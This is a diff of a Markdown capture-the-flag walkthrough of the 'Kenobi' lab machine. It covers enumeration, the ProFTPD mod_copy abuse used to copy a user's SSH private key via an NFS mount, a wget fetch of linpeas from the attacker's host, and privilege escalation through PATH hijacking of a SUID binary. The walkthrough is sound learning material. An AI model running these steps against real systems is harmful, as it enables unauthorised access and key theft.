@@ -4,6 +4,8 @@
 
 **IP Address: 10.10.243.180**
 
+<br>
+
 I first tried to visit the given IP address using my web browser to see if it hosted any website. I was greeted with the following website (Port 80 is open for HTTP):
 
 <img style="float: left;" src="screenshots/screenshot1.png">
@@ -20,7 +22,7 @@ nmap -sV -p- -vv 10.10.243.180
 nmap -sV -vv 10.10.243.180
 ```
 
-
+<br>
 
 While I left the thorough nmap scan running in the background, I analyzed the results of the Quick nmap scan, which told me that ports **21 (ftp), 22 (ssh), 80 (http), 111 (Remote Procedure Call), 139 (samba), 445 (samba) and 2049 (rpc)** were open.  
 
@@ -32,7 +34,7 @@ gobuster dir -u http://10.10.243.180 -w /usr/share/wordlists/dirbuster/directory
 
 I doubt there will be any useful directories found, but I've learnt that it is always good to check just in case!
 
-
+<br>
 
 While previously, I learned to enumerate samba shares using a tool, **enum4linux,** this time, I used nmap scripts to do the enumeration. The command used is:
 
@@ -46,13 +48,13 @@ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.243.180
 
 As we can see, 3 shares were enumerated, **IPC$, anonymous and print$**. By using **smbclient**, I tried logging into the "**anonymous**" share, and it allowed me to do so without requiring any authentication! 
 
-
+<br>
 
 Using the command **ls** revealed that there was a **log.txt** file:
 
 <img style="float: left;" src="screenshots/screenshot3.png">
 
-
+<br>
 
 The "**log.txt**" file was just a basic ProFTPD configuration file, which gave us a lot of interesting and potentially useful information about the server. The port that FTP was running on was port **21**.
 
@@ -60,7 +62,7 @@ Now we have to make use of port **111**, which hosts **RPC**.
 
 *Remote Procedure Call (RPC) is a protocol that one program can use to request a service from a program located in another computer on a network without having to understand the network's details. RPC is used to call other processes on the remote systems like a local system. A procedure call is also sometimes known as a function call or a subroutine call.*
 
-
+<br>
 
 In our case, port 111 is access to a network file system. So I could use nmap to enumerate it with specific scripts:
 
@@ -72,13 +74,13 @@ In our case, port 111 is access to a network file system. So I could use nmap to
 
 Hence, we can see that **/var** is a mount!
 
-I can use **netcat** to connect to the machine on its ftp port! This can be done via:
+I can use **netcat** to connect to the machine on its ftp port. This can be done via:
 
 ```
 nc 10.10.243.180 21
 ```
 
-
+<br>
 
 With that, I successfully connected to the ftp server.
 
@@ -90,19 +92,19 @@ searchsploit proftpd 1.3.5
 
 <img style="float: left;" src="screenshots/screenshot5.png">
 
-
+<br>
 
 The mod_copy module implements **SITE CPFR** and **SITE CPTO** commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
 
 From the **log.txt** file earlier, I know that the **id_rsa** file of user, **kenobi,** can be found in **/home/kenobi/.ssh/id_rsa**. With knowledge of the mount point, **/var**, I can mount my local computer to the machine, and use that to obtain the **id_rsa** file. This will then allow me to access the machine via **ssh** as user kenobi!
 
-
+<br>
 
 To do this, first, I used the **SITE CPFR** and **SITE CPTO** commands to copy the id_rsa file from kenobi's home folder to the **/var/tmp** folder. 
 
 <img style="float: left;" src="screenshots/screenshot6.png">
 
-
+<br>
 
 Next, I created a directory in my local computer's /mnt directory, using:
 
@@ -120,7 +122,7 @@ From there, I could just navigate to the **/tmp** folder and obtain the **id_rsa
 
 <img style="float: left;" src="screenshots/screenshot7.png">
 
-
+<br>
 
 I then copied the id_rsa file over to my desktop, changed its permissions to be read and write by owner only, using 
 
@@ -134,11 +136,9 @@ I could then ssh into the machine with the rsa key:
 ssh kenobi@10.10.243.180 -i id_rsa
 ```
 
- 
+With that, I obtained **user.txt**, which was located in the home directory of the user **kenobi**.
 
-#### With that, I obtained the flag from "user.txt", which was located in the home directory of the user kenobi.
-
-
+<br>
 
 ---
 
@@ -163,18 +163,18 @@ This creates a server at the default port **8000**.
 In the victim machine, I used
 
 ```
-wget http://10.4.6.205:8000/linpeas.sh
+wget http://YOUR_IP_HERE/linpeas.sh
 ```
 
 After successfully downloading, I just had to make it an executable before I could run it! 
 
-
+<br>
 
 After running linpeas, I noticed that there was an interesting file that had its SUID bit set => **/usr/bin/menu**:
 
 <img style="float: left;" src="screenshots/screenshot8.png">
 
-
+<br>
 
 Upon running the menu binary, I came across some interesting options:
 
@@ -200,9 +200,9 @@ Hence, when I run the menu binary and run option 1, which uses the "curl" binary
 
 <img style="float: left;" src="screenshots/screenshot12.png">
 
+<br>
 
-
-#### With that, I obtained the flag from "root.txt", which was located in the home directory of the root user.
+With that, I obtained **root.txt**, which was located in the home directory of the **root user**.
 
 
 
